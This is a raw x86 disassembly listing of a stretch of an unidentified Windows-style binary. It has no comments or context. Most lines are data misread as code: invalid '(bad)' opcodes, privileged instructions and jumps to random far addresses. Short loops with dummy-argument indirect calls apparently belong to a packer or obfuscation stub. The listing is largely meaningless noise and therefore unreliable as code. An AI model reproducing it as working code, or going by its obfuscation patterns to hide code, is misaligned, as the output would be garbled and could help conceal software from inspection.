  40a1c4:	pop    eax
  40a1c5:	sub    eax,0x8c92767e
  40a1ca:	rcr    DWORD PTR [eax+ecx*4],0x7f
  40a1ce:	ss ret 0xf8fa
  40a1d2:	clc    
  40a1d3:	stc    
  40a1d4:	stc    
  40a1d5:	pop    di
  40a1d7:	loope  0x40a22d
  40a1d9:	adc    edi,DWORD PTR [edx+0x607c1ff1]
  40a1df:	cli    
  40a1e0:	cmp    al,0xd9
  40a1e2:	pop    esi
  40a1e3:	mov    ebp,0x46bb2c0f
  40a1e8:	xchg   edi,eax
  40a1e9:	enter  0x7ca3,0xa9
  40a1ed:	dec    ebx
  40a1ee:	mov    al,ds:0x514f2fd8
  40a1f3:	mov    dl,0xac
  40a1f5:	idiv   DWORD PTR [eax+0x3d]
  40a1f8:	outs   dx,DWORD PTR ds:[esi]
  40a1f9:	pop    ebx
  40a1fa:	mov    esi,0xc3878579
  40a1ff:	sub    al,0xc8
  40a201:	sti    
  40a202:	inc    edi
  40a203:	repz (bad) 
  40a206:	inc    eax
  40a207:	fdiv   DWORD PTR [eax]
  40a209:	mov    al,ds:0xfdbc8c2c
  40a20e:	adc    al,al
  40a210:	sbb    eax,0xc8a59341
  40a215:	cmp    DWORD PTR [ebx-0x7f],esp
  40a218:	(bad)  
  40a219:	xchg   ebp,eax
  40a21a:	mov    eax,0x6d8d3bb2
  40a21f:	jge    0x40a1b3
  40a221:	inc    ebx
  40a222:	pop    ds
  40a223:	imul   edi,DWORD PTR [esi-0x1b],0xffffff84
  40a227:	ins    BYTE PTR es:[edi],dx
  40a228:	std    
  40a229:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a22a:	cmc    
  40a22b:	imul   edi,DWORD PTR [esi+0x6e],0xd1fc45c7
  40a232:	test   DWORD PTR [eax+edi*8+0x33d845c7],ebx
  40a239:	test   DWORD PTR [eax+edi*8+0x45c7d213],ebx
  40a240:	aam    0x32
  40a242:	test   DWORD PTR [eax+edi*8-0x312da7f],ebx
  40a249:	inc    edx
  40a24a:	add    BYTE PTR [eax],al
  40a24c:	add    BYTE PTR [eax],al
  40a24e:	add    cl,ch
  40a250:	sldt   WORD PTR [eax]
  40a253:	add    BYTE PTR [ebx],dh
  40a255:	ror    BYTE PTR [ebx],cl
  40a257:	adc    eax,0x42fced
  40a25c:	inc    edx
  40a25d:	mov    DWORD PTR ds:0x42fced,edx
  40a263:	cmp    DWORD PTR ds:0x42fced,0x10
  40a26a:	jae    0x40a2a2
  40a270:	cmp    DWORD PTR ds:0x42fced,0x14
  40a277:	jne    0x40a297
  40a27d:	push   0x83c5
  40a282:	push   0x5a78
  40a287:	push   0x49ef
  40a28c:	push   0x22e4
  40a291:	call   DWORD PTR ds:0x42e2e7
  40a297:	jmp    0x40a254
  40a29c:	add    DWORD PTR ds:0x42e128,edx
  40a2a2:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  40a2a9:	and    DWORD PTR ds:0x42e70f,0x7d59
  40a2b3:	jmp    0x40a671
  40a2b8:	into   
  40a2b9:	iret   
  40a2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2bb:	cmp    esp,DWORD PTR [ebp+0x7cc97171]
  40a2c1:	sbb    bl,BYTE PTR [edi+0x2b]
  40a2c4:	loop   0x40a2ab
  40a2c6:	gs jecxz 0x40a30e
  40a2c9:	cmc    
  40a2ca:	jo     0x40a33c
  40a2cc:	lahf   
  40a2cd:	jge    0x40a33f
  40a2cf:	jo     0x40a295
  40a2d1:	jmp    0x7b893fa
  40a2d6:	mov    ebp,0x8cee1669
  40a2db:	push   0x60
  40a2dd:	mov    DWORD PTR [edi-0x57165348],ebx
  40a2e3:	xor    ch,BYTE PTR [ebx+0x2d]
  40a2e6:	pusha  
  40a2e7:	or     eax,0x2a629141
  40a2ec:	ret    0x65c7
  40a2ef:	xchg   ebp,eax
  40a2f0:	(bad)  
  40a2f1:	cwde   
  40a2f2:	mov    dl,0xee
  40a2f4:	scas   eax,DWORD PTR es:[edi]
  40a2f5:	jbe    0x40a2f3
  40a2f7:	(bad)  
  40a2f8:	push   cs
  40a2f9:	sub    edi,DWORD PTR [ebp-0x25]
  40a2fc:	ins    DWORD PTR es:[edi],dx
  40a2fd:	xchg   esi,eax
  40a2fe:	inc    ebp
  40a2ff:	rol    dh,0x30
  40a302:	ss (bad) 
  40a304:	loope  0x40a32b
  40a306:	push   ebp
  40a307:	jnp    0x40a30c
  40a309:	jne    0x40a30d
  40a30b:	popa   
  40a30c:	scas   al,BYTE PTR es:[edi]
  40a30d:	xor    eax,0xd466d451
  40a312:	add    ah,BYTE PTR [esi]
  40a314:	adc    ebp,DWORD PTR [ebx]
  40a316:	sub    ecx,DWORD PTR [ebx+edi*8]
  40a319:	mov    edi,0x58c7d239
  40a31e:	fwait
  40a31f:	sbb    dh,BYTE PTR [eax]
  40a321:	in     eax,0xae
  40a323:	test   al,0x28
  40a325:	jae    0x40a32c
  40a327:	xchg   esi,eax
  40a328:	jnp    0x40a3a3
  40a32a:	adc    ebx,DWORD PTR [ecx]
  40a32c:	add    BYTE PTR [esi],bh
  40a32e:	pop    ds
  40a32f:	(bad)
  40a332:	xor    al,0xa9
  40a334:	dec    edx
  40a335:	mov    BYTE PTR [ebp+edx*2-0x5b382a53],dl
  40a33c:	iret   
  40a33d:	inc    al
  40a33f:	add    ch,BYTE PTR [ecx-0x5d]
  40a342:	out    0x17,eax
  40a344:	pop    es
  40a345:	mov    WORD PTR [ecx+0x19286275],cs
  40a34b:	aaa    
  40a34c:	xchg   edx,eax
  40a34d:	(bad)  
  40a34e:	xchg   edx,eax
  40a34f:	int    0xd8
  40a351:	retf   
  40a352:	adc    al,0x62
  40a354:	mov    al,ds:0xc577ef5c
  40a359:	pusha  
  40a35a:	mov    cs,WORD PTR [edx-0x24]
  40a35d:	pop    ecx
  40a35e:	jnp    0x40a393
  40a360:	add    esp,edi
  40a362:	adc    bl,dl
  40a364:	js     0x40a3e5
  40a366:	pop    ebp
  40a367:	ficomp DWORD PTR [esi-0x4c]
  40a36a:	sub    al,0x66
  40a36c:	cli    
  40a36d:	mov    ds:0x9985db87,al
  40a372:	push   ebp
  40a373:	mov    edi,DWORD PTR [eax-0x49fe5bb7]
  40a379:	arpl   WORD PTR [ebx+0x5c5ca0a4],sp
  40a37f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a380:	ret    0xd5c9
  40a383:	imul   esp,DWORD PTR [esp+ecx*2],0xc4016348
  40a38a:	xor    eax,0xa3c121a7
  40a38f:	jmp    0x40a37a
  40a391:	xor    eax,0xce7fb280
  40a396:	fimul  WORD PTR [edx-0x36b82ff0]
  40a39c:	mov    eax,ss:0x877e4007
  40a3a2:	call   0x9365:0x92e9d957
  40a3a9:	push   ebx
  40a3aa:	sub    ah,bh
  40a3ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3ad:	or     DWORD PTR [edi+0x4b],ecx
  40a3b0:	jnp    0x40a3c6
  40a3b2:	ja     0x40a374
  40a3b4:	(bad)  
  40a3b5:	int    0x2
  40a3b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3b8:	cs test eax,0x35305a3
  40a3be:	test   eax,0x3493bf0a
  40a3c3:	inc    edi
  40a3c4:	clc    
  40a3c5:	dec    ebp
  40a3c6:	(bad)  
  40a3c8:	sbb    al,0x57
  40a3ca:	add    ch,dh
  40a3cc:	repnz lahf 
  40a3ce:	inc    ecx
  40a3cf:	loop   0x40a43f
  40a3d1:	sbb    eax,0x6166948c
  40a3d6:	out    dx,al
  40a3d7:	push   cs
  40a3d8:	dec    esi
  40a3d9:	aam    0x8c
  40a3db:	je     0x40a3bd
  40a3dd:	neg    DWORD PTR [ebp+0x1e]
  40a3e0:	adc    BYTE PTR [edx+0x4216ddf0],dh
  40a3e6:	shl    DWORD PTR [edi],0x9d
  40a3e9:	push   edx
  40a3ea:	stc    
  40a3eb:	jmp    0x5661:0x8a4924fb
  40a3f2:	or     al,0xd3
  40a3f4:	out    dx,eax
  40a3f5:	xlat   BYTE PTR ds:[ebx]
  40a3f6:	jp     0x40a451
  40a3f8:	fidivr DWORD PTR [edx]
  40a3fa:	sbb    BYTE PTR [eax+eiz*1+0xe9fbca1],bl
  40a401:	adc    esp,DWORD PTR [esi+0x28c0aee7]
  40a407:	das    
  40a408:	mov    bh,0x6e
  40a40a:	scas   al,BYTE PTR es:[edi]
  40a40b:	mov    ebx,0x744ede77
  40a410:	lods   al,BYTE PTR ds:[esi]
  40a411:	or     DWORD PTR [edx],eax
  40a413:	jno    0x40a3c1
  40a415:	sahf   
  40a416:	hlt    
  40a417:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a418:	scas   al,BYTE PTR es:[edi]
  40a419:	and    ebp,DWORD PTR [edx+0x37fa9591]
  40a41f:	jp     0x40a3a7
  40a421:	retf   
  40a422:	sbb    DWORD PTR [edi],ebp
  40a424:	xor    dl,BYTE PTR [eax]
  40a426:	jmp    0xcd65:0x90c23436
  40a42d:	sub    bh,al
  40a42f:	jno    0x40a3cb
  40a431:	pop    ebx
  40a432:	out    dx,eax
  40a433:	mov    ds:0xc4884ce7,eax
  40a438:	cmp    DWORD PTR [esi+ebx*2-0x4b3f888d],ebx
  40a43f:	inc    edx
  40a440:	shl    DWORD PTR [eax+0x3],cl
  40a443:	nop
  40a444:	es push ds
  40a446:	call   0x9d96:0xeaf20752
  40a44d:	inc    ebx
  40a44e:	std    
  40a44f:	ds xchg edx,eax
  40a451:	call   0x79775bdc
  40a456:	(bad)  
  40a457:	into   
  40a458:	sub    al,0x9b
  40a45a:	jmp    0x40a3f5
  40a45c:	xor    DWORD PTR [ecx],ebx
  40a45e:	mov    esi,0x13590e27
  40a463:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a464:	aam    0x1c
  40a466:	pop    esi
  40a467:	js     0x40a3f4
  40a469:	jge    0x40a4d1
  40a46b:	nop
  40a46c:	xchg   ecx,eax
  40a46d:	ds pop esp
  40a46f:	inc    ecx
  40a470:	imul   ebx,DWORD PTR [ecx+0x1e5f54f7],0x5b
  40a477:	outs   dx,BYTE PTR ds:[esi]
  40a478:	cli    
  40a479:	xor    eax,0x36dbf257
  40a47e:	in     al,dx
  40a47f:	out    dx,al
  40a480:	jecxz  0x40a40b
  40a482:	cwde   
  40a483:	rcr    DWORD PTR [esi+0x6524e460],1
  40a489:	int3   
  40a48a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a48b:	int    0x2f
  40a48d:	add    al,0x73
  40a48f:	xor    BYTE PTR [esi],bh
  40a491:	xlat   BYTE PTR ds:[ebx]
  40a492:	std    
  40a493:	mov    dh,0x61
  40a495:	sub    DWORD PTR [eax],edi
  40a497:	pop    ebx
  40a498:	inc    ebx
  40a499:	imul   ebx,DWORD PTR [ebp-0x14de042c],0xffffffca
  40a4a0:	lock mov edx,0x3a0b97d
  40a4a6:	popf   
  40a4a7:	add    al,0xf6
  40a4a9:	inc    eax
  40a4aa:	sub    cl,BYTE PTR [ebx-0x7c]
  40a4ad:	xchg   ebp,eax
  40a4ae:	fdivr  st,st(2)
  40a4b0:	push   edi
  40a4b1:	pop    ds
  40a4b2:	fwait
  40a4b3:	adc    DWORD PTR [edx],0x33
  40a4b6:	int3   
  40a4b7:	lock stc 
  40a4b9:	add    eax,DWORD PTR [ecx+esi*1-0x52892977]
  40a4c0:	inc    edi
  40a4c1:	jmp    0x7ba86827
  40a4c6:	push   ecx
  40a4c7:	adc    DWORD PTR [ebp+0x5d],eax
  40a4ca:	push   0x1501b220
  40a4cf:	or     cl,BYTE PTR [ebp+0x3abc32a6]
  40a4d5:	stos   BYTE PTR es:[edi],al
  40a4d6:	push   cs
  40a4d7:	es dec eax
  40a4d9:	das    
  40a4da:	mov    edi,0x1232e5f
  40a4df:	pop    esi
  40a4e0:	push   0x9a3b9c49
  40a4e5:	test   DWORD PTR [esi+ecx*2-0x23f73d34],esi
  40a4ec:	sbb    eax,0x210421c
  40a4f1:	shl    BYTE PTR es:[edi-0x5eb2d036],1
  40a4f8:	and    ecx,0x4d
  40a4fb:	or     eax,ebp
  40a4fd:	jecxz  0x40a4c3
  40a4ff:	xchg   ebx,eax
  40a500:	cmp    eax,0x87c54182
  40a505:	sub    eax,0x57e2584a
  40a50a:	fisttp WORD PTR [edx]
  40a50c:	cmp    DWORD PTR [edx],esp
  40a50e:	sahf   
  40a50f:	cmp    dl,BYTE PTR [esi+0x3eb9eb10]
  40a515:	dec    edi
  40a516:	pop    es
  40a517:	dec    ebp
  40a518:	test   DWORD PTR [edi+edi*4+0x3e],0x6801f070
  40a520:	loop   0x40a503
  40a522:	jbe    0x40a4e3
  40a524:	fisttp QWORD PTR [ebx-0x2b]
  40a527:	and    BYTE PTR [edi],0x5b
  40a52a:	push   esi
  40a52b:	sbb    eax,DWORD PTR [ecx+0x26307cbd]
  40a531:	in     eax,0x5e
  40a533:	mov    eax,ds:0xff978c0c
  40a538:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a539:	sub    dh,BYTE PTR [ecx-0x1d347273]
  40a53f:	dec    ebx
  40a540:	leave  
  40a541:	xlat   BYTE PTR ds:[ebx]
  40a542:	out    dx,al
  40a543:	sub    bl,BYTE PTR [ecx+ebx*4+0x1728ecb6]
  40a54a:	push   ecx
  40a54b:	push   ebp
  40a54c:	and    al,0xe6
  40a54e:	jge    0x40a4d4
  40a550:	mov    esp,0xbe2e4e60
  40a555:	mov    edi,esp
  40a557:	test   eax,0x190f7fd9
  40a55c:	test   DWORD PTR [esi+0xf486053],ebp
  40a562:	inc    edi
  40a563:	in     eax,0x2
  40a565:	pop    ebx
  40a566:	xor    BYTE PTR [esi],0xf9
  40a569:	pop    ds
  40a56a:	xchg   esp,eax
  40a56b:	loopne 0x40a57b
  40a56d:	fucomp st(5)
  40a570:	ror    BYTE PTR [eax+0x70],0x37
  40a574:	aas    
  40a575:	iret   
  40a576:	popf   
  40a577:	or     DWORD PTR [edi+ebx*4+0x5b],ecx
  40a57b:	or     al,0xae
  40a57d:	sub    DWORD PTR ds:0x8bc390db,esi
  40a583:	jns    0x40a5c3
  40a585:	jne    0x40a507
  40a587:	es stos BYTE PTR es:[edi],al
  40a589:	push   cs
  40a58a:	ins    DWORD PTR es:[edi],dx
  40a58b:	mov    dh,ch
  40a58d:	pop    edx
  40a58e:	xor    DWORD PTR [edx+0x76],esi
  40a591:	push   esp
  40a592:	aad    0x78
  40a594:	(bad)  
  40a595:	sbb    eax,0x68b3b181
  40a59a:	es xchg esp,eax
  40a59c:	retf   
  40a59d:	add    DWORD PTR [ebx-0x6cdeb8a2],eax
  40a5a3:	shr    DWORD PTR [edx+0x67],0xfd
  40a5a7:	repz pusha 
  40a5a9:	not    BYTE PTR [ebp+edx*2+0x55bd93b9]
  40a5b0:	mov    al,0xb4
  40a5b2:	jbe    0x40a61a
  40a5b4:	dec    ebx
  40a5b5:	sub    eax,0x3f7537b2
  40a5ba:	and    bl,BYTE PTR [eax+edx*2]
  40a5bd:	movups xmm5,XMMWORD PTR [eax+ecx*8]
  40a5c1:	inc    ebx
  40a5c2:	and    eax,ebx
  40a5c4:	lds    ebp,FWORD PTR [eax+0x38]
  40a5c7:	das    
  40a5c8:	adc    eax,0xb690b444
  40a5cd:	add    bh,ch
  40a5cf:	pop    edx
  40a5d0:	and    ecx,esp
  40a5d2:	push   esi
  40a5d3:	dec    esp
  40a5d4:	jo     0x40a581
  40a5d6:	mov    WORD PTR cs:[edi],cs
  40a5d9:	xor    edx,ebp
  40a5db:	sbb    eax,0x2b0a157a
  40a5e0:	sbb    ah,BYTE PTR [esi+eax*4-0xa]
  40a5e4:	adc    ebp,0x7593378
  40a5ea:	icebp  
  40a5eb:	mov    ebx,0x96f511f3
  40a5f0:	inc    ebx
  40a5f1:	stos   DWORD PTR es:[edi],eax
  40a5f2:	paddd  mm4,QWORD PTR [edi-0x7e]
  40a5f6:	imul   ebx,ecx,0xd8ddf26c
  40a5fc:	imul   ebp,DWORD PTR ds:0x85916cb9,0xa5085777
  40a606:	addr16 inc edi
  40a608:	adc    al,0xb3
  40a60a:	xor    eax,0x26113b5d
  40a60f:	xor    al,0x86
  40a611:	pop    edx
  40a612:	cmp    ebx,DWORD PTR [ebp-0x4c46c511]
  40a618:	imul   ebp,DWORD PTR [edx-0x4],0x7a6fcc9a
  40a61f:	add    ecx,DWORD PTR [esi-0x47]
  40a622:	fisubr DWORD PTR [ecx-0x20771690]
  40a628:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a629:	fwait
  40a62a:	sbb    al,0x3b
  40a62c:	mov    al,0x52
  40a62e:	fs sub eax,0x73840d34
  40a634:	inc    esp
  40a635:	jmp    0x56ce0b95
  40a63a:	popa   
  40a63b:	rcl    bl,cl
  40a63d:	adc    ecx,DWORD PTR [esi-0x1f]
  40a640:	into   
  40a641:	jbe    0x40a699
  40a643:	jnp    0x40a689
  40a645:	loope  0x40a606
  40a647:	adc    DWORD PTR ds:0x9ecf7fbb,0x14f730d0
  40a651:	dec    ecx
  40a652:	push   edi
  40a653:	sub    bl,BYTE PTR [edi-0x5a]
  40a656:	(bad)  
  40a657:	stos   BYTE PTR es:[edi],al
  40a658:	scas   eax,DWORD PTR es:[di]
  40a65a:	sub    BYTE PTR [edx+0x35],ah
  40a65d:	push   0x8
  40a65f:	fdiv   DWORD PTR [ebx-0x71]
  40a662:	xchg   ecx,eax
  40a663:	push   eax
  40a664:	bound  esp,QWORD PTR [edi+0x11]
  40a667:	mov    ebx,0x4bec27f8
  40a66c:	or     DWORD PTR [edx],edi
  40a66e:	in     eax,dx
  40a66f:	int    0xbb
  40a671:	mov    DWORD PTR [ebp-0x34],0xf89c853c
  40a678:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a67f:	and    DWORD PTR ds:0x42e6ef,0x0
  40a689:	xor    edx,edx
  40a68b:	or     edx,DWORD PTR ds:0x42e6ef
  40a691:	inc    edx
  40a692:	mov    DWORD PTR ds:0x42e6ef,edx
  40a698:	cmp    DWORD PTR ds:0x42e6ef,0xf
  40a69f:	jne    0x40a6c6
  40a6a5:	push   DWORD PTR [ebp-0x28]
  40a6a8:	push   DWORD PTR [ebp-0x10]
  40a6ab:	push   0x42e6f7
  40a6b0:	push   DWORD PTR [ebp-0x14]
  40a6b3:	push   DWORD PTR [ebp-0x18]
  40a6b6:	push   0x89bc
  40a6bb:	push   0x39f6
  40a6c0:	call   DWORD PTR ds:0x42e2eb
  40a6c6:	cmp    DWORD PTR ds:0x42e6ef,0xe
  40a6cd:	jne    0x40a6e0
  40a6d3:	mov    edx,DWORD PTR ds:0x42e6ef
  40a6d9:	inc    edx
  40a6da:	mov    DWORD PTR ds:0x42e6ef,edx
  40a6e0:	cmp    DWORD PTR ds:0x42e6ef,0x1c
  40a6e7:	jb     0x40a689
  40a6ed:	and    DWORD PTR ds:0x42fcdd,0x0
  40a6f7:	jmp    0x40a709
  40a6fc:	mov    edx,DWORD PTR ds:0x42fcdd
  40a702:	inc    edx
  40a703:	mov    DWORD PTR ds:0x42fcdd,edx
  40a709:	cmp    DWORD PTR ds:0x42fcdd,0x13
  40a710:	jae    0x40a766
  40a716:	cmp    DWORD PTR ds:0x42fcdd,0xb
  40a71d:	jne    0x40a733
  40a723:	push   0x42e26d
  40a728:	push   0x42e25b
  40a72d:	call   DWORD PTR ds:0x42e547
  40a733:	cmp    DWORD PTR ds:0x42fcdd,0xa
  40a73a:	jne    0x40a74f
  40a740:	xor    edx,edx
  40a742:	add    edx,DWORD PTR ds:0x42fcdd
  40a748:	inc    edx
  40a749:	mov    DWORD PTR ds:0x42fcdd,edx
  40a74f:	jmp    0x40a6fc
  40a754:	mov    edi,DWORD PTR ds:0x42e134
  40a75a:	xor    edi,DWORD PTR ds:0x42e713
  40a760:	mov    DWORD PTR ds:0x42e134,edi
  40a766:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a76d:	adc    DWORD PTR ds:0x42e713,edx
  40a773:	mov    edx,DWORD PTR [ebp+0x8]
  40a776:	xor    edx,eax
  40a778:	sub    edi,DWORD PTR ds:0x42fcd1
  40a77e:	mov    edi,DWORD PTR [ebp-0x10]
  40a781:	add    edx,ecx
  40a783:	mov    DWORD PTR ds:0x42fce5,0x29c7
  40a78d:	cmp    edi,edx
  40a78f:	mov    DWORD PTR ds:0x42e713,0x10c5
  40a799:	je     0x40d88b
  40a79f:	mov    DWORD PTR ds:0x42fcf9,0x41c2
  40a7a9:	push   ebx
  40a7aa:	mov    DWORD PTR ds:0x42fd09,0x2602
  40a7b4:	jmp    0x40d4a8
  40a7b9:	mov    edx,DWORD PTR [ebp-0x8]
  40a7bc:	mov    DWORD PTR ds:0x42e130,0x1c
  40a7c6:	cmp    DWORD PTR ds:0x42e130,0x0
  40a7cd:	je     0x40a824
  40a7d3:	cmp    DWORD PTR ds:0x42e130,0x7
  40a7da:	jne    0x40a7f8
  40a7e0:	push   DWORD PTR [ebp-0x10]
  40a7e3:	push   0x42e1e7
  40a7e8:	push   0x42e23d
  40a7ed:	push   0x42e23d
  40a7f2:	call   DWORD PTR ds:0x42e2ef
  40a7f8:	cmp    DWORD PTR ds:0x42e130,0x8
  40a7ff:	jne    0x40a812
  40a805:	mov    edi,DWORD PTR ds:0x42e130
  40a80b:	dec    edi
  40a80c:	mov    DWORD PTR ds:0x42e130,edi
  40a812:	mov    edi,DWORD PTR ds:0x42e130
  40a818:	dec    edi
  40a819:	mov    DWORD PTR ds:0x42e130,edi
  40a81f:	jmp    0x40a7c6
  40a824:	mov    edi,DWORD PTR [ebp-0x10]
  40a827:	xor    DWORD PTR ds:0x42e12c,0x3333
  40a831:	sub    edi,edx
  40a833:	mov    edx,DWORD PTR ds:0x42fd6e
  40a839:	add    DWORD PTR ds:0x42e707,edx
  40a83f:	mov    edx,DWORD PTR [ebp-0x4]
  40a842:	jmp    0x40ac00
  40a847:	addr16 sub al,0x5e
  40a84a:	xchg   esi,eax
  40a84b:	jno    0x40a89f
  40a84d:	ja     0x40a838
  40a84f:	dec    eax
  40a850:	(bad)  
  40a851:	in     al,dx
  40a852:	std    
  40a853:	push   0xffffffbd
  40a855:	sub    dl,ah
  40a857:	in     al,0xf1
  40a859:	jo     0x40a8cb
  40a85b:	lahf   
  40a85c:	jge    0x40a8ce
  40a85e:	jo     0x40a875
  40a860:	add    BYTE PTR [ebp+0x19],bh
  40a863:	add    BYTE PTR [eax+0x63243cd5],bh
  40a869:	retf   
  40a86a:	enter  0x717c,0x36
  40a86e:	sbb    al,BYTE PTR [ecx-0x2a]
  40a871:	in     eax,dx
  40a872:	xchg   edx,eax
  40a873:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a874:	push   0xffffffbd
  40a876:	mov    esi,0x612769f0
  40a87b:	fisttp DWORD PTR [ebx-0x4bef9389]
  40a881:	cmp    eax,DWORD PTR [esi-0x71]
  40a884:	and    dl,cl
  40a886:	retf   0xbb0b
  40a889:	fcom   DWORD PTR [edx]
  40a88b:	fnstenv [edi-0x11]
  40a88e:	shr    DWORD PTR [esi+0x6f],1
  40a891:	call   0x558a:0x1253f66d
  40a898:	hlt    
  40a899:	mov    ebp,0xac015ab9
  40a89e:	xchg   esp,eax
  40a89f:	xor    DWORD PTR [edi+0xe],edi
  40a8a2:	out    0xdc,eax
  40a8a4:	add    eax,0x4b508a44
  40a8a9:	leave  
  40a8aa:	pop    ds
  40a8ab:	sti    
  40a8ac:	fld    DWORD PTR [ebx+0x76]
  40a8af:	mov    edi,0xde298d46
  40a8b4:	ror    BYTE PTR [edi-0x70],1
  40a8b7:	pop    ebx
  40a8b8:	push   edx
  40a8b9:	pop    ebx
  40a8ba:	cmp    ah,ch
  40a8bc:	and    eax,0x847219e4
  40a8c1:	mov    bl,0x7e
  40a8c3:	adc    al,0x53
  40a8c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8c6:	out    0x59,al
  40a8c8:	or     DWORD PTR [ecx+0xa2f5ccb],eax
  40a8ce:	outs   dx,DWORD PTR ds:[esi]
  40a8cf:	pop    edi
  40a8d0:	push   ecx
  40a8d1:	sbb    ebp,DWORD PTR [edx+0x49]
  40a8d4:	mov    ecx,0x10983a7a
  40a8d9:	xchg   esi,eax
  40a8da:	fistp  WORD PTR [ebx+0x1ac96176]
  40a8e0:	adc    bh,bl
  40a8e2:	outs   dx,DWORD PTR ds:[esi]
  40a8e3:	ret    0x6727
  40a8e6:	push   ebp
  40a8e7:	or     DWORD PTR [ebx+edi*4],0x6a
  40a8eb:	dec    eax
  40a8ec:	je     0x40a941
  40a8ee:	xchg   edi,eax
  40a8ef:	sub    esi,edi
  40a8f1:	cmp    dl,al
  40a8f3:	pop    ecx
  40a8f4:	lock jecxz 0x40a939
  40a8f7:	pop    di
  40a8f9:	ds addr16 movsx edi,bl
  40a8fe:	(bad)  
  40a8ff:	stc    
  40a900:	dec    esi
  40a901:	ds push ds
  40a903:	lods   al,BYTE PTR ds:[esi]
  40a904:	bswap  esp
  40a906:	mov    ebx,0x21951db9
  40a90b:	ins    BYTE PTR es:[edi],dx
  40a90c:	dec    edi
  40a90d:	cli    
  40a90e:	xor    BYTE PTR [eax],0xce
  40a911:	dec    edx
  40a912:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a913:	call   0x4352:0xd7b9001a
  40a91a:	fcomp  DWORD PTR [edx-0x4da3affd]
  40a920:	lds    ebp,FWORD PTR [esi+0xb18d33d]
  40a926:	or     edi,DWORD PTR [ebp+0x53]
  40a929:	pushf  
  40a92a:	inc    ecx
  40a92b:	(bad)  
  40a92d:	fisubr DWORD PTR [ebx-0x6e121aee]
  40a933:	cli    
  40a934:	out    dx,al
  40a935:	jecxz  0x40a9a6
  40a937:	test   al,dh
  40a939:	dec    esi
  40a93a:	(bad)  
  40a93c:	cs lahf 
  40a93e:	fistp  DWORD PTR [ebp+0x7da644bb]
  40a944:	ja     0x40a8fc
  40a946:	jp     0x40a930
  40a948:	push   ebp
  40a949:	pushf  
  40a94a:	cmc    
  40a94b:	out    dx,eax
  40a94c:	lock jle 0x40a972
  40a94f:	cmp    DWORD PTR [edx],ecx
  40a951:	mov    ds:0x722968cf,al
  40a956:	mov    cl,0xca
  40a958:	jmp    0x1961:0x5edc5786
  40a95f:	and    dl,dl
  40a961:	frstor [esi+0x1]
  40a964:	dec    ebx
  40a965:	je     0x40a945
  40a967:	jmp    0x36d1:0x9a85ef0c
  40a96e:	shl    ebp,1
  40a970:	pop    eax
  40a971:	mov    eax,0xdbbb4289
  40a976:	retf   
  40a977:	cmp    al,0xe7
  40a979:	xor    BYTE PTR [ebx+0x18],0xd1
  40a97d:	push   ebp
  40a97e:	dec    esi
  40a97f:	fst    DWORD PTR [edx]
  40a981:	inc    ecx
  40a982:	je     0x40a948
  40a984:	gs pop ss
  40a986:	hlt    
  40a987:	or     eax,0xa16a6fd
  40a98c:	mov    esi,0x560ee5ea
  40a991:	neg    DWORD PTR [eax+ecx*4-0x41]
  40a995:	jbe    0x40a99f
  40a997:	fadd   QWORD PTR [eax+0x2a]
  40a99a:	jne    0x40a951
  40a99c:	jmp    0xa94c:0x6b08e24e
  40a9a3:	rcpps  xmm1,XMMWORD PTR [edi-0x7f]
  40a9a7:	jae    0x40a9f4
  40a9a9:	pop    eax
  40a9aa:	mov    ecx,DWORD PTR [ebx+0xd2a97b0]
  40a9b0:	mov    DWORD PTR [edi+esi*4+0x4a485f25],edx
  40a9b7:	jb     0x40a9bb
  40a9b9:	inc    esi
  40a9ba:	pop    ebx
  40a9bb:	sti    
  40a9bc:	mov    edx,0x87636403
  40a9c1:	test   al,0xf8
  40a9c3:	push   cs
  40a9c4:	icebp  
  40a9c5:	cwde   
  40a9c6:	stos   BYTE PTR es:[edi],al
  40a9c7:	push   0x4452982c
  40a9cc:	mov    al,ds:0xfe07e47d
  40a9d1:	neg    eax
  40a9d3:	sbb    ecx,esi
  40a9d5:	or     BYTE PTR [edi+0x6877b5ee],dl
  40a9db:	jns    0x40a971
  40a9dd:	js     0x40a9dd
  40a9df:	sub    DWORD PTR [esi+0x53],0x7bb380c2
  40a9e6:	cld    
  40a9e7:	sub    al,0x79
  40a9e9:	xchg   esp,eax
  40a9ea:	cmp    eax,0x1446d643
  40a9ef:	mov    BYTE PTR [ebx-0x31],cl
  40a9f2:	lahf   
  40a9f3:	push   ss
  40a9f4:	mov    bl,BYTE PTR [eax+0x45]
  40a9f7:	inc    esi
  40a9f8:	test   ah,cl
  40a9fa:	add    cl,BYTE PTR [esi]
  40a9fc:	add    eax,0x84454617
  40aa01:	xor    ebp,0x30664e15
  40aa07:	xor    bl,dl
  40aa09:	mov    ds:0x13b34fce,al
  40aa0e:	sbb    BYTE PTR [edx],cl
  40aa10:	push   cs
  40aa11:	push   ds
  40aa12:	sub    DWORD PTR [ebx+0x50e1647e],esi
  40aa18:	sub    eax,0xa693b13f
  40aa1d:	xor    eax,0x3719d960
  40aa22:	mov    fs,ebx
  40aa24:	jle    0x40aa51
  40aa26:	adc    ch,BYTE PTR [esi-0x10]
  40aa29:	call   0x5592:0x253dcea6
  40aa30:	cmp    eax,0xf096fb13
  40aa35:	aam    0xb3
  40aa37:	sub    DWORD PTR [ebp+0x583d5a91],esp
  40aa3d:	cmp    eax,0xf2653923
  40aa42:	in     al,0x63
  40aa44:	int3   
  40aa45:	fstp   TBYTE PTR [edx]
  40aa47:	mov    edx,0xc325a826
  40aa4c:	dec    ebp
  40aa4d:	sub    DWORD PTR [ebx-0x132272c1],edi
  40aa53:	sbb    eax,0xc26b56ec
  40aa58:	sbb    eax,ebp
